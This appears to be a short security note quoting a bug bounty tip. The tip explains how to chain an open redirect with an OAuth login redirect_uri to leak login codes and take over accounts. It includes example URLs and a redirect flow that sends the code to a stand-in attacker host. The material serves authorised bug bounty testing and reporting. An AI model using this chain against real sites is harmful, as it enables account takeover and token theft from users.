# Open Redirect

![[Pasted image 20240527191733.png]]

```
💰 Bug Bounty Tips: How can you maximize payouts for "Low" risk open redirect issues? 🤑  
  
I've personally earned over $$$$$ in bounties by chaining open redirect submissions to ATOs. These "Low" severity bugs can often be escalated through a double redirection, resulting in bounties ranging from $750 to $5000, depending on the program.  
  
Open redirects can be chained with legitimate redirects, allowing attackers to exfiltrate OAuth codes and tokens for potential account takeovers.  
  
Here's the quick breakdown:  
(1) Find a low-severity open redirect, for example: https://example[.]com/next-step?url=https://attackersite[.]com….  
(2) Look for site login functionality on core domains or subdomains. Assuming login is integrated with Auth0 or another equivalent service provider at http://login[.]example[.]com. In such cases, a valid redirect would usually look something like https://login[.]example[.]com/?redirect_uri=  
(3) You can now chain the vulnerable open redirect identified in step 1 with the login page and still be able to exfiltrate the login code in most cases. For example, you could craft a URI like https://login.example[.]com/?redirect_uri=https://example[.]com/next-step%3furl=https://attackersite[.]com…  
  
When a victim navigates to the above link and logs in, upon successful login, it will redirect them in this flow to the attacker controlled site:  
https://login.example[.]com -> (First Redirect) https://example[.]com/next-step?code=:logincode:&state=:state…: -> (Second Redirect) https://attackersite[.]com/?code=:logincode:&state=:state…:  
  
As a result, this ultimately leads to the leakage of Auth0 or other equivalent codes/tokens to an attacker-controlled server, resulting in an ATO.  
  
Common mistakes: Reporting open redirects as simple issues without escalating their impact. Don't underestimate their potential. Always look for ways to level up! 💡
```